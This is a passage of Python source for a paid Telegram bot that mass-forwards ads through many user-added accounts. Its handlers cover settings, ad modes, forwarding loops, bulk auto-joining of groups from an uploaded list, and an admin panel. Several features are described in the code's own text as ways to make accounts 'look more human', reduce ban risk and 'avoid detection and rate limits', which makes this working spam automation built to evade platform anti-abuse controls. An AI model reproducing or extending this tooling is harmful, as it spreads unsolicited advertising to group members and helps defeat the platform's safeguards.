                auto_reply_status = "✅ ON" if (enabled_by_user and has_auto_reply_message) else "❌ OFF"
            else:
                auto_reply_status = "❌ OFF"
            
            # Interval - Show delays with preset name (Slow/Medium/Fast, not Safe/Balanced/Risky)
            preset = user_doc.get('interval_preset', 'medium')
            if preset == 'custom':
                custom = user_doc.get('custom_interval', {})
                interval_display = f"Custom ({custom.get('msg_delay', 30)}s / {custom.get('round_delay', 600)}s)"
            else:
                preset_info = INTERVAL_PRESETS.get(preset, INTERVAL_PRESETS['medium'])
                msg_delay = preset_info['msg_delay']
                round_delay = preset_info['round_delay']
                # Show only preset name (Slow/Medium/Fast) without Safe/Balanced/Risky
                preset_name = preset.capitalize()
                interval_display = f"{preset_name} ({msg_delay}s / {round_delay}s)"
            
            # Smart Rotation
            smart_rotation = user_doc.get('smart_rotation', False)
            rotation_status = "✅ ON" if smart_rotation else "❌ OFF"
            
            # Logs
            logs_enabled = bool(user_doc.get('logs_chat_id'))
            logs_status = "✅ Enabled" if logs_enabled else "❌ Disabled"
            
            # Auto Leave
            auto_leave_enabled = user_doc.get('auto_leave_groups', True)
            leave_status = "✅ ON" if auto_leave_enabled else "❌ OFF"
            
            # Auto Sleep status for settings caption
            auto_sleep_enabled = user_doc.get('auto_sleep_enabled', False)
            auto_sleep_duration = user_doc.get('auto_sleep_duration', 1800)
            if auto_sleep_duration == 1800:
                auto_sleep_duration_text = "30 min"
            elif auto_sleep_duration == 3600:
                auto_sleep_duration_text = "1 hr"
            elif auto_sleep_duration == 18000:
                auto_sleep_duration_text = "5 hrs"
            elif auto_sleep_duration == 28800:
                auto_sleep_duration_text = "8 hrs"
            else:
                auto_sleep_duration_text = f"{auto_sleep_duration // 60} min"
            auto_sleep_status = "✅ ON (2AM–6AM)" if auto_sleep_enabled else "❌ OFF"

            text = (
                "<b>⚙️ Settings</b>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                "<b>📋 Current Configuration:</b>\n"
                f"├ <b>📣 Ads Mode:</b> <code>{ads_mode}</code>\n"
                f"├ <b>💬 Auto-Reply:</b> <code>{auto_reply_status}</code>\n"
                f"├ <b>⏱️ Interval:</b> <code>{interval_display}</code>\n"
                f"├ <b>🔄 Smart Rotation:</b> <code>{rotation_status}</code>\n"
                f"├ <b>📝 Logs:</b> <code>{logs_status}</code>\n"
                f"├ <b>🚫 Auto Leave Failed:</b> <code>{leave_status}</code>\n"
                f"└ <b>💤 Auto Sleep:</b> <code>{auto_sleep_status}</code>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
            )
            await event.edit(text, parse_mode='html', buttons=settings_menu_keyboard(uid))
            return
        
        if data == "toggle_auto_leave":
            user_doc = get_user(uid)
            current = user_doc.get('auto_leave_groups', True)
            new_value = not current
            users_col.update_one({'user_id': int(uid)}, {'$set': {'auto_leave_groups': new_value}}, upsert=True)
            
            status = "enabled" if new_value else "disabled"
            await event.answer(f"Auto Leave Failed {status}!", alert=True)
            
            # Refresh settings menu to show updated status
            await event.edit("<b>⚙️ Settings</b>\n\n<i>Loading...</i>", parse_mode='html')
            # Small delay before re-rendering
            await asyncio.sleep(0.1)
            
            # Re-render full settings menu
            user_doc = get_user(uid)
            tier_settings = get_user_tier_settings(uid)
            ads_mode = user_doc.get('ads_mode', 'saved').upper()
            
            # Auto-reply status (check if enabled and has message)
            auto_reply_feature_available = tier_settings.get('auto_reply_enabled', False)
            if auto_reply_feature_available:
                user = get_user(uid)
                enabled_by_user = user.get('autoreply_enabled', False)
                user_accounts = get_user_accounts(uid)
                has_auto_reply_message = False
                if user_accounts:
                    for acc in user_accounts:
                        settings = get_account_settings(str(acc.get('_id')))
                        if settings.get('auto_reply'):
                            has_auto_reply_message = True
                            break
                auto_reply_status = "✅ ON" if (enabled_by_user and has_auto_reply_message) else "❌ OFF"
            else:
                auto_reply_status = "❌ OFF"
            preset = user_doc.get('interval_preset', 'medium')
            if preset == 'custom':
                custom = user_doc.get('custom_interval', {})
                interval_display = f"Custom ({custom.get('msg_delay', 30)}s / {custom.get('round_delay', 600)}s)"
            else:
                interval_display = INTERVAL_PRESETS.get(preset, INTERVAL_PRESETS['medium'])['name']
            smart_rotation = user_doc.get('smart_rotation', False)
            rotation_status = "✅ ON" if smart_rotation else "❌ OFF"
            logs_enabled = bool(user_doc.get('logs_chat_id'))
            logs_status = "✅ Enabled" if logs_enabled else "❌ Disabled"
            leave_status = "✅ ON" if new_value else "❌ OFF"
            
            text = (
                "<b>⚙️ Settings</b>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                "<b>📋 Current Configuration:</b>\n"
                f"├ <b>📣 Ads Mode:</b> <code>{ads_mode}</code>\n"
                f"├ <b>💬 Auto-Reply:</b> <code>{auto_reply_status}</code>\n"
                f"├ <b>⏱️ Interval:</b> <code>{interval_display}</code>\n"
                f"├ <b>🔄 Smart Rotation:</b> <code>{rotation_status}</code>\n"
                f"├ <b>📝 Logs:</b> <code>{logs_status}</code>\n"
                f"└ <b>🚫 Auto Leave Failed:</b> <code>{leave_status}</code>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
            )
            await event.edit(text, parse_mode='html', buttons=settings_menu_keyboard(uid))
            return
        
        if data == "refresh_all_groups":
            # Refresh All Groups is FREE for everyone
            accounts = get_user_accounts(uid)
            if not accounts:
                await event.answer("Add an account first!", alert=True)
                return
            
            progress_msg = await event.respond("<b>🔄 Refreshing all groups...</b>", parse_mode='html')
            
            results = []
            for acc in accounts:
                account_id = str(acc['_id'])
                phone = acc.get('phone', 'Unknown')[-4:]
                
                try:
                    session_enc = acc.get('session')
                    if not session_enc:
                        results.append(f"<code>{phone}</code>: Session not found")
                        continue
                    
                    session = cipher_suite.decrypt(session_enc.encode()).decode()
                    client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
                    
                    await client.connect()
                    if not await client.is_user_authorized():
                        results.append(f"<code>{phone}</code>: Session expired")
                        await client.disconnect()
                        continue
                    
                    # Count groups before refresh
                    before_count = account_auto_groups_col.count_documents({'account_id': account_id})
                    
                    # Refresh groups
                    count = await refresh_account_groups(client, account_id)
                    
                    # Count after refresh
                    after_count = account_auto_groups_col.count_documents({'account_id': account_id})
                    
                    if after_count > before_count:
                        results.append(f"<code>{phone}</code>: {before_count} → {after_count} (+{after_count - before_count})")
                    else:
                        results.append(f"<code>{phone}</code>: {before_count} (no new groups)")
                    
                    await client.disconnect()
                    
                except Exception as e:
                    results.append(f"<code>{phone}</code>: Error - {str(e)[:30]}")
            
            if results:
                result_text = "<b>🔄 Refresh Complete</b>\n\n" + "\n".join(results)
            else:
                result_text = "<b>❌ No groups refreshed</b>"
            
            await progress_msg.edit(result_text, parse_mode='html', buttons=[[Button.inline("Back", b"menu_settings")]])
            return
        
        if data == "menu_autoreply":
            tier = "Premium" if is_premium(uid) else "Free"
            text = f"<b>💬 Auto Reply</b>\n\n<b>Tier:</b> <code>{tier}</code>\n\n"
            
            if is_premium(uid):
                user = get_user(uid)
                enabled = user.get('autoreply_enabled', True)
                
                # Check if user has set a custom message
                accounts = get_user_accounts(uid)
                has_custom = False
                if accounts:
                    for acc in accounts:
                        settings_doc = account_settings_col.find_one({'account_id': str(acc['_id'])})
                        if settings_doc and 'auto_reply' in settings_doc and settings_doc.get('auto_reply'):
                            has_custom = True
                            break
                
                text += f"<b>Status:</b> <code>{'ON' if enabled else 'OFF'}</code>\n"
                text += f"<b>Custom Reply:</b> {'✅' if has_custom else '❌'} <code>{'Set' if has_custom else 'Not Set'}</code>"
            else:
                text += "🔒 <b>Auto-reply is a premium feature.</b>\n\n"
                text += "Upgrade to premium to set custom auto-reply messages!"
            
            await event.edit(text, parse_mode='html', buttons=autoreply_menu_keyboard(uid))
            return
        
        if data == "autoreply_view":
            if not is_premium(uid):
                await event.answer("Premium only!", alert=True)
                return
            
            # Get custom message from account settings
            accounts = get_user_accounts(uid)
            reply = None
            if accounts:
                for acc in accounts:
                    settings_doc = account_settings_col.find_one({'account_id': str(acc['_id'])})
                    if settings_doc and 'auto_reply' in settings_doc:
                        reply = settings_doc.get('auto_reply')
                        break
            
            if reply:
                text = f"<b>💬 Current Auto Reply</b>\n\n<blockquote>{_h(reply)}</blockquote>"
            else:
                text = "<b>💬 Current Auto Reply</b>\n\n<i>No custom message set yet.</i>"
            
            await event.edit(text, parse_mode='html', buttons=[[Button.inline("← Back", b"menu_autoreply")]])
            return

        if data == "autoreply_toggle":
            if not is_premium(uid):
                await event.answer("Premium feature only", alert=True)
                return

            # Flip the flag and refresh menu
            user = get_user(uid)
            enabled = user.get('autoreply_enabled', True)
            new_value = not enabled
            users_col.update_one({'user_id': int(uid)}, {'$set': {'autoreply_enabled': new_value}})

            try:
                await event.answer(f"Auto Reply {'enabled' if new_value else 'disabled'}", alert=False)
            except Exception:
                pass

            # Re-render menu
            tier = "Premium"
            user = get_user(uid)
            text = f"<b>💬 Auto Reply</b>\n\n<b>Tier:</b> <code>{tier}</code>\n\n"
            enabled = user.get('autoreply_enabled', True)
            
            # Check if user has set a custom message
            accounts = get_user_accounts(uid)
            has_custom = False
            if accounts:
                for acc in accounts:
                    settings_doc = account_settings_col.find_one({'account_id': str(acc['_id'])})
                    if settings_doc and 'auto_reply' in settings_doc and settings_doc.get('auto_reply'):
                        has_custom = True
                        break
            
            text += f"<b>Status:</b> <code>{'ON' if enabled else 'OFF'}</code>\n"
            text += f"<b>Custom Reply:</b> {'✅' if has_custom else '❌'} <code>{'Set' if has_custom else 'Not Set'}</code>"
            await event.edit(text, parse_mode='html', buttons=autoreply_menu_keyboard(uid))
            return
        
        if data == "autoreply_custom":
            if not is_premium(uid):
                await event.answer("Premium only!", alert=True)
                return
            user_states[uid] = {'action': 'custom_autoreply'}
            await event.edit(
                "<b>💬 Set Custom Reply</b>\n\nSend your custom auto-reply message:",
                parse_mode='html',
                buttons=[[Button.inline("← Back", b"menu_autoreply")]]
            )
            return
        
        if data == "go_premium":
            # Show plan selection menu for everyone
            plan_msg = (
                "**Choose Your Plan:**\n\n"
                "• Scout - Free starter plan\n"
                "• Grow - Scale your campaigns (₹69)\n"
                "• Prime - Advanced automation (₹199)\n"
                "• Dominion - Enterprise level (₹389)"
            )
            
            welcome_image = MESSAGES.get('welcome_image', '')
            if welcome_image:
                try:
                    await event.delete()
                except:
                    pass
                await main_bot.send_file(uid, welcome_image, caption=plan_msg, buttons=plan_select_keyboard(uid))
            else:
                await event.edit(plan_msg, buttons=plan_select_keyboard(uid))
            return
        
        if data.startswith("buy_"):
            plan = data.replace("buy_", "")
            prices = {"1month": "$20", "3months": "$50", "6months": "$70"}
            price = prices.get(plan, "$20")
            
            owner_id = CONFIG['owner_id']
            try:
                await main_bot.send_message(owner_id, f"**Premium Purchase Request**\n\nUser ID: `{uid}`\nPlan: {plan}\nPrice: {price}")
            except:
                pass
            
            await event.edit(
                f"**Request Sent!**\n\nPlan: {plan}\nPrice: {price}\n\nAdmin has been notified.\nThey will contact you shortly.\n\nYour User ID: `{uid}`",
                buttons=[[Button.inline("Back", b"go_premium")]]
            )
            return
        
        if data == "account_limit_reached":
            await event.edit(
                "**Account Limit Reached**\n\nYou've reached the maximum accounts for your tier.\n\nUpgrade to Premium for more accounts!",
                buttons=[
                    [Button.inline("Buy Premium", b"go_premium")],
                    [Button.inline("Back", b"menu_account")]
                ]
            )
            return
        
        if data == "menu_logs":
            logger_bot_username = CONFIG.get('logger_bot_username', 'logstesthubot')
            logger_link = f"https://t.me/{logger_bot_username}"

            user_doc = get_user(uid)
            enabled = bool(user_doc.get('logs_chat_id'))
            status = "✅ Enabled" if enabled else "❌ Disabled"

            buttons = [[Button.url("Start Logger Bot", logger_link)]]
            if enabled:
                buttons.append([Button.inline("Disable Logs", b"logs_disable_global")])
            else:
                buttons.append([Button.inline("Enable Logs", b"logs_enable_global")])
            buttons.append([Button.inline("Back", b"enter_dashboard")])

            await event.edit(
                "<b>📝 Logs</b>\n\n"
                "<blockquote>Once enabled, logs will be sent for <b>all</b> your added accounts.</blockquote>\n\n"
                f"<b>Status:</b> <code>{status}</code>",
                parse_mode='html',
                buttons=buttons
            )
            return

        # ===================== Auto Sleep =====================
        if data == "menu_auto_sleep":
            user_doc = get_user(uid)
            enabled = user_doc.get('auto_sleep_enabled', False)
            status = "✅ ON" if enabled else "❌ OFF"
            toggle_label = "🔴 Turn OFF" if enabled else "🟢 Turn ON"

            buttons = [
                [Button.inline(toggle_label, b"autosleep_toggle")],
                [Button.inline("← Back", b"menu_settings")]
            ]

            await event.edit(
                f"<b>💤 Auto Sleep</b>\n\n"
                f"<blockquote>"
                f"When enabled, the bot will automatically pause all forwarding activity every night from "
                f"<b>2:00 AM → 6:00 AM</b> (daily).\n\n"
                f"During this window, the bot sleeps and resumes automatically at 6:00 AM. "
                f"This makes your accounts look more human and reduces ban risk."
                f"</blockquote>\n\n"
                f"<b>🕑 Sleep Window:</b> <code>2:00 AM – 6:00 AM</code>\n"
                f"<b>Status:</b> <code>{status}</code>",
                parse_mode='html',
                buttons=buttons
            )
            return

        # Auto Sleep - Toggle ON/OFF
        if data == "autosleep_toggle":
            user_doc = get_user(uid)
            current = user_doc.get('auto_sleep_enabled', False)
            new_status = not current
            users_col.update_one({'user_id': uid}, {'$set': {'auto_sleep_enabled': new_status}})

            user_doc = get_user(uid)
            enabled = user_doc.get('auto_sleep_enabled', False)
            status = "✅ ON" if enabled else "❌ OFF"
            toggle_label = "🔴 Turn OFF" if enabled else "🟢 Turn ON"

            buttons = [
                [Button.inline(toggle_label, b"autosleep_toggle")],
                [Button.inline("← Back", b"menu_settings")]
            ]

            await event.edit(
                f"<b>💤 Auto Sleep</b>\n\n"
                f"<blockquote>"
                f"When enabled, the bot will automatically pause all forwarding activity every night from "
                f"<b>2:00 AM → 6:00 AM</b> (daily).\n\n"
                f"During this window, the bot sleeps and resumes automatically at 6:00 AM. "
                f"This makes your accounts look more human and reduces ban risk."
                f"</blockquote>\n\n"
                f"<b>🕑 Sleep Window:</b> <code>2:00 AM – 6:00 AM</code>\n"
                f"<b>Status:</b> <code>{status}</code>",
                parse_mode='html',
                buttons=buttons
            )
            return

        # ===================== Ads Mode (Saved/Custom/Post Link) =====================
        if data == "menu_ads_mode":
            user_doc = get_user(uid)
            mode = user_doc.get('ads_mode', 'saved')
            modes = {
                'saved': 'Saved Message',
                'custom': 'Custom Message',
                'post': 'Post Link'
            }
            text = (
                "<b>📣 Ads Mode</b>\n\n"
                "<blockquote>Select which message will be used while running ads.</blockquote>\n\n"
                f"<b>Current:</b> <code>{modes.get(mode, mode)}</code>"
            )
            buttons = [
                [Button.inline("Saved Message" + (" ✅" if mode == 'saved' else ""), b"ads_mode_saved")],
                [Button.inline("Set Custom Message" + (" ✅" if mode == 'custom' else ""), b"ads_mode_custom")],
                [Button.inline("Set Post Link" + (" ✅" if mode == 'post' else ""), b"ads_mode_post")],
                [Button.inline("← Back", b"menu_settings")]
            ]
            await event.edit(text, parse_mode='html', buttons=buttons)
            return

        if data == "ads_mode_saved":
            users_col.update_one({'user_id': uid}, {'$set': {'ads_mode': 'saved'}}, upsert=True)
            await event.answer("Ads Mode set: Saved Message", alert=True)
            await event.edit("<b>✅ Ads Mode Updated</b>\n\nNow bot will use each account's <b>Saved Messages</b> for forwarding.", parse_mode='html', buttons=[[Button.inline("← Back", b"menu_ads_mode")]])
            return

        if data == "ads_mode_custom":
            users_col.update_one({'user_id': uid}, {'$set': {'ads_mode': 'custom'}}, upsert=True)
            cur = (get_user(uid).get('ads_custom_message') or '').strip()
            preview = _h(cur[:500]) if cur else '<i>Not set</i>'
            text = (
                "<b>✍️ Custom Message</b>\n\n"
                "<b>Current Message:</b>\n"
                f"{preview}\n\n"
                "Send a new message to update it."
            )
            await event.edit(
                text,
                parse_mode='html',
                buttons=[
                    [Button.inline("Set Message", b"ads_custom_set")],
                    [Button.inline("View Current", b"ads_custom_view")],
                    [Button.inline("← Back", b"menu_ads_mode")]
                ]
            )
            return

        if data == "ads_custom_view":
            cur = (get_user(uid).get('ads_custom_message') or '').strip()
            preview = _h(cur) if cur else '<i>Not set</i>'
            await event.edit(f"<b>✍️ Current Custom Message</b>\n\n{preview}", parse_mode='html', buttons=[[Button.inline("← Back", b"ads_mode_custom")]])
            return

        if data == "ads_custom_set":
            user_states[uid] = {'action': 'set_ads_custom_message'}
            await event.edit("<b>✍️ Send your custom message now</b>\n\n<i>Next message you send will be saved and used for ads.</i>", parse_mode='html', buttons=[[Button.inline("← Cancel", b"menu_ads_mode")]])
            return

        if data == "ads_mode_post":
            users_col.update_one({'user_id': uid}, {'$set': {'ads_mode': 'post'}}, upsert=True)
            cur = (get_user(uid).get('ads_post_link') or '').strip()
            preview = _h(cur) if cur else '<i>Not set</i>'
            await event.edit(
                "<b>🔗 Post Link</b>\n\n"
                f"<b>Current Link:</b> {preview}\n\n"
                "Send a Telegram post link like:\n"
                "<code>https://t.me/username/123</code>\n"
                "or\n"
                "<code>https://t.me/c/123456/789</code>",
                parse_mode='html',
                buttons=[
                    [Button.inline("Set Link", b"ads_post_set")],
                    [Button.inline("View Current", b"ads_post_view")],
                    [Button.inline("← Back", b"menu_ads_mode")]
                ]
            )
            return

        if data == "ads_post_view":
            cur = (get_user(uid).get('ads_post_link') or '').strip()
            preview = _h(cur) if cur else '<i>Not set</i>'
            await event.edit(f"<b>🔗 Current Post Link</b>\n\n{preview}", parse_mode='html', buttons=[[Button.inline("← Back", b"ads_mode_post")]])
            return

        if data == "ads_post_set":
            user_states[uid] = {'action': 'set_ads_post_link'}
            await event.edit("<b>🔗 Send post link now</b>\n\n<i>Next message you send should be a Telegram post link.</i>", parse_mode='html', buttons=[[Button.inline("← Cancel", b"menu_ads_mode")]])
            return
        
        # ===================== Smart Rotation (Premium) =====================
        if data == "menu_smart_rotation":
            if not is_premium(uid):
                await event.edit(
                    "<b>🔒 Premium Feature</b>\n\n<blockquote>Purchase Premium to unlock Smart Rotation.</blockquote>",
                    parse_mode='html',
                    buttons=[[Button.inline("💎 View Plans", b"back_plans")], [Button.inline("← Back", b"menu_settings")]]
                )
                return
            
            # Check if user has any accounts
            user_accounts = list(accounts_col.find({"owner_id": uid}))
            if not user_accounts:
                await event.answer("❌ Please add an account first!", alert=True)
                return
            
            # Get user settings (stored separately with user_id)
            user_settings = users_col.find_one({"user_id": uid})
            if not user_settings:
                user_settings = {}
            current = user_settings.get('smart_rotation', False)
            
            await event.edit(
                "<b>🔄 Smart Rotation</b>\n\n"
                "<blockquote>When enabled, the bot will randomly shuffle the order of your target groups before each forwarding round.\n\n"
                "This makes your forwarding pattern unpredictable and more natural, helping avoid detection and rate limits.</blockquote>\n\n"
                f"<b>Status:</b> {'✅ Enabled' if current else '❌ Disabled'}",
                parse_mode='html',
                buttons=[
                    [Button.inline("✅ Enable" if not current else "❌ Disable", b"toggle_smart_rotation")],
                    [Button.inline("\u2190 Back", b"menu_settings")]
                ]
            )
            return
        
        if data == "toggle_smart_rotation":
            if not is_premium(uid):
                await event.answer("⭐ Premium feature only!", alert=True)
                return
            
            # Get current state from users collection
            user_settings = users_col.find_one({"user_id": uid})
            if not user_settings:
                user_settings = {}
            current = user_settings.get('smart_rotation', False)
            new_val = not current
            
            # Save to users collection
            users_col.update_one(
                {"user_id": uid},
                {"$set": {"smart_rotation": new_val}},
                upsert=True
            )
            
            await event.edit(
                "<b>🔄 Smart Rotation</b>\n\n"
                "<blockquote>When enabled, the bot will randomly shuffle the order of your target groups before each forwarding round.\n\n"
                "This makes your forwarding pattern unpredictable and more natural, helping avoid detection and rate limits.</blockquote>\n\n"
                f"<b>Status:</b> {'✅ Enabled' if new_val else '❌ Disabled'}",
                parse_mode='html',
                buttons=[
                    [Button.inline("✅ Enable" if not new_val else "❌ Disable", b"toggle_smart_rotation")],
                    [Button.inline("\u2190 Back", b"menu_settings")]
                ]
            )
            return
        
        # ===================== Auto Group Join (Premium) =====================
        if data == "menu_auto_group_join":
            if not is_premium(uid):
                await event.answer("⭐ Premium feature only!", alert=True)
                return
            
            # Check if user has any accounts
            user_accounts = list(accounts_col.find({"owner_id": uid}))
            if not user_accounts:
                await event.answer("❌ Please add an account first!", alert=True)
                return
            
            await event.edit(
                "<b>👥 Auto Group Join</b>\n\n"
                "<blockquote>Upload a .txt file with group links (one per line), and all your logged-in accounts will automatically join those groups.\n\n"
                "Supported formats:\n"
                "• https://t.me/groupname\n"
                "• t.me/groupname\n"
                "• @groupname</blockquote>\n\n"
                "Send the .txt file now, or tap Back to cancel.",
                parse_mode='html',
                buttons=[
                    [Button.inline("\u2190 Back", b"menu_settings")]
                ]
            )
            # Set user state to expect .txt file
            user_states[uid] = {'state': 'awaiting_group_join_file'}
            return

        if data == "logs_enable_global":
            # Enable logs globally for user (applies to all accounts)
            users_col.update_one({'user_id': int(uid)}, {'$set': {'logs_chat_id': int(uid)}}, upsert=True)
            await event.answer("Logs enabled", alert=True)
            await event.edit(
                "<b>✅ Logs Enabled</b>\n\n<blockquote>Logs will now be sent for <b>all</b> your added accounts.</blockquote>",
                parse_mode='html',
                buttons=[[Button.inline("Back", b"menu_logs")]]
            )
            return

        if data == "logs_disable_global":
            users_col.update_one({'user_id': int(uid)}, {'$unset': {'logs_chat_id': ""}})
            await event.answer("Logs disabled", alert=True)
            await event.edit(
                "<b>❌ Logs Disabled</b>\n\n<i>You will no longer receive logs.</i>",
                parse_mode='html',
                buttons=[[Button.inline("Back", b"menu_logs")]]
            )
            return

        if data == "menu_fwd_mode":
            user = get_user(uid)
            current = user.get('forwarding_mode', 'auto')  # Free users default to Groups Only
            user_is_premium = is_premium(uid)
            
            modes = {
                'topics': 'Forward to Topics Only',
                'auto': 'Forward to Groups Only',
                'both': 'Forward to Both (Topics first, then Groups)'
            }
            
            text = (
                "<b>🔄 Forwarding Mode</b>\n\n"
                "<blockquote>Select how ads should be forwarded.</blockquote>"
            )
            
            if not user_is_premium:
                text += "\n\n<i>💡 Free users can only forward to Groups. Upgrade for more options!</i>"
            
            buttons = []
            for mode, label in modes.items():
                mark = " ✅" if mode == current else ""
                
                # Lock topics and both for free users
                if not user_is_premium and mode in ['topics', 'both']:
                    buttons.append([Button.inline(f"{label} 🔒", b"locked_fwd_mode")])
                else:
                    buttons.append([Button.inline(f"{label}{mark}", f"set_fwd_mode_{mode}")])
            
            buttons.append([Button.inline("← Back", b"enter_dashboard")])
            
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data.startswith("set_fwd_mode_"):
            mode = data.replace("set_fwd_mode_", "")
            users_col.update_one({'user_id': uid}, {'$set': {'forwarding_mode': mode}})
            modes = {
                'topics': 'Forward to Topics Only',
                'auto': 'Forward to Groups Only',
                'both': 'Forward to Both (Topics first, then Groups)'
            }
            await event.answer(f"Mode set: {modes.get(mode, mode)}", alert=True)
            
            text = (
                "<b>🔄 Forwarding Mode</b>\n\n"
                "<blockquote>Select how ads should be forwarded.</blockquote>"
            )
            
            buttons = []
            for m, label in modes.items():
                mark = " ✅" if m == mode else ""
                buttons.append([Button.inline(f"{label}{mark}", f"set_fwd_mode_{m}")])
            buttons.append([Button.inline("← Back", b"enter_dashboard")])
            
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data == "menu_refresh":
            accounts = get_user_accounts(uid)
            total_groups = 0
            for acc in accounts:
                try:
                    session = cipher_suite.decrypt(acc['session'].encode()).decode()
                    client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
                    await client.connect()
                    count = await fetch_groups_for_account(client, acc['_id'])
                    total_groups += count
                    await client.disconnect()
                except:
                    pass
            await event.answer(f"Refreshed! Found {total_groups} groups.", alert=True)
            
            text = render_dashboard_text(uid)
            buttons = main_dashboard_keyboard(uid)
            # Admin button removed (already in main_dashboard_keyboard)
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data == "start_all_ads":
            # Update all added accounts profile (last name + bio) when starting ads
            try:
                await apply_account_profile_templates(uid)
            except Exception:
                pass

            accounts = get_user_accounts(uid)
            if not accounts:
                await event.answer("No accounts to start!", alert=True)
                return
            
            user = get_user(uid)
            fwd_mode = user.get('forwarding_mode', 'topics')
            
            started = 0
            for acc in accounts:
                acc_id = str(acc['_id'])
                is_fwd = acc.get('is_forwarding', False)
                
                print(f"[ADS DEBUG] Account {acc_id}: is_forwarding={is_fwd}, fwd_mode={fwd_mode}")
                
                if not is_fwd:
                    has_groups = False
                    if fwd_mode in ('topics', 'both'):
                        topic_count = account_topics_col.count_documents({'account_id': {'$in': _account_id_variants(acc['_id'])}})
                        print(f"[ADS DEBUG] Topics count: {topic_count}")
                        has_groups = topic_count > 0
                    if fwd_mode in ('auto', 'both') and not has_groups:
                        auto_count = account_auto_groups_col.count_documents({'account_id': {'$in': _account_id_variants(acc['_id'])}})
                        print(f"[ADS DEBUG] Auto groups count: {auto_count}")
                        has_groups = auto_count > 0
                    
                    print(f"[ADS DEBUG] has_groups={has_groups}")
                    
                    # Start account even without groups (user will need to add topics/groups after)
                    accounts_col.update_one({'_id': acc['_id']}, {'$set': {'is_forwarding': True}})
                    
                    if acc['_id'] not in forwarding_tasks or forwarding_tasks[acc['_id']].done():
                        task = asyncio.create_task(run_forwarding_loop(uid, acc['_id']))
                        forwarding_tasks[acc['_id']] = task
                        status_msg = " (⚠️ No groups configured!)" if not has_groups else ""
                        print(f"[ADS] Started forwarding task for account {acc['_id']}{status_msg}")
                    
                    started += 1
                else:
                    print(f"[ADS DEBUG] Account {acc_id} already forwarding, skipped")
            
            print(f"[ADS] Started {started} accounts for user {uid}")
            await event.answer(f"Started {started} accounts!", alert=True)
            
            text = render_dashboard_text(uid)
            buttons = main_dashboard_keyboard(uid)
            # Admin button removed (already in main_dashboard_keyboard)
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data == "stop_all_ads":
            accounts = get_user_accounts(uid)
            stopped = 0
            for acc in accounts:
                if acc.get('is_forwarding'):
                    account_id_str = str(acc['_id'])
                    accounts_col.update_one({'_id': acc['_id']}, {'$set': {'is_forwarding': False}})
                    if acc['_id'] in forwarding_tasks:
                        forwarding_tasks[acc['_id']].cancel()
                        del forwarding_tasks[acc['_id']]
                    stopped += 1
            
            # Send log message to user (once for all stopped accounts)
            if stopped > 0:
                try:
                    user_doc = get_user(uid)
                    logs_chat_id = user_doc.get('logs_chat_id')
                    if logs_chat_id and CONFIG.get('logger_bot_token'):
                        log_msg = (
                            f"<b>⏹️ Ads Stopped</b>\n\n"
                            f"<b>Accounts Stopped:</b> <code>{stopped}</code>\n\n"
                            f"<i>Advertising has been stopped by user.</i>"
                        )
                        await logger_bot.send_message(int(logs_chat_id), log_msg, parse_mode='html')
                        print(f"[STOP] Stop log sent to user {uid}")
                except Exception as e:
                    print(f"[LOG ERROR] Failed to send stop log to user {uid}: {e}")
            
            await event.answer(f"Stopped {stopped} accounts!", alert=True)
            
            text = render_dashboard_text(uid)
            buttons = main_dashboard_keyboard(uid)
            # Admin button removed (already in main_dashboard_keyboard)
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data == "tier_free":
            if not is_approved(uid):
                approve_user(uid)
            
            accounts = get_user_accounts(uid)
            max_acc = get_user_max_accounts(uid)
            tier_settings = get_user_tier_settings(uid)
            tier = "Premium" if is_premium(uid) else "Free"
            active = sum(1 for a in accounts if a.get('is_forwarding'))
            
            text = (
                f"<b>{tier} Dashboard</b>\n\n"
                f"<b>Accounts:</b> <code>{len(accounts)}/{max_acc}</code>\n"
                f"<b>Active:</b> <code>{active}</code> | <b>Inactive:</b> <code>{len(accounts) - active}</code>\n\n"
                f"<b>Delays:</b> <code>{tier_settings['msg_delay']}s msg / {tier_settings['round_delay']}s round</code>"
            )

            await event.edit(text, parse_mode='html', buttons=account_list_keyboard(uid))
            return
        
        if data == "tier_premium":
            if is_premium(uid):
                await event.edit(
                    "**Premium Active**\n\nYou already have premium access!",
                    buttons=[[Button.inline("Go to Dashboard", b"tier_free")], [Button.inline("Back", b"enter_dashboard")]]
                )
            else:
                await event.edit(
                    f"**Premium Access**\n\n{MESSAGES['premium_contact']}",
                    buttons=premium_contact_keyboard()
                )
            return
        
        if data == "admin_panel" or data == "back_admin":
            if not is_admin(uid):
                await event.answer("Admin only!", alert=True)
                return
            
            total_users = users_col.count_documents({})
            premium_users = users_col.count_documents({'tier': 'premium'})
            total_accounts = accounts_col.count_documents({})
            active = accounts_col.count_documents({'is_forwarding': True})
            total_admins = admins_col.count_documents({}) + 1
            
            today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
            new_today = users_col.count_documents({'created_at': {'$gte': today_start}})
            
            text = (
                "<b>⚙️ Admin Panel</b>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                "<b>👥 User Statistics:</b>\n"
                f"├ <b>Total Users:</b> <code>{total_users}</code> <i>(+{new_today} today)</i>\n"
                f"├ <b>💎 Premium Users:</b> <code>{premium_users}</code>\n"
                f"└ <b>👨‍💼 Total Admins:</b> <code>{total_admins}</code>\n\n"
                "<b>📱 Account Statistics:</b>\n"
                f"├ <b>Total Accounts:</b> <code>{total_accounts}</code>\n"
                f"└ <b>▶️ Active Forwarding:</b> <code>{active}</code>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
            )
            
            await event.edit(text, parse_mode='html', buttons=admin_panel_keyboard())
            return
        
        if data == "admin_admins":
            if not is_admin(uid):
                return
            
            # Show all admins with IDs and usernames
            try:
                owner_id = CONFIG.get('owner_id')
                all_admins = list(admins_col.find({}, {'user_id': 1}))
                admin_ids = [admin['user_id'] for admin in all_admins]
                
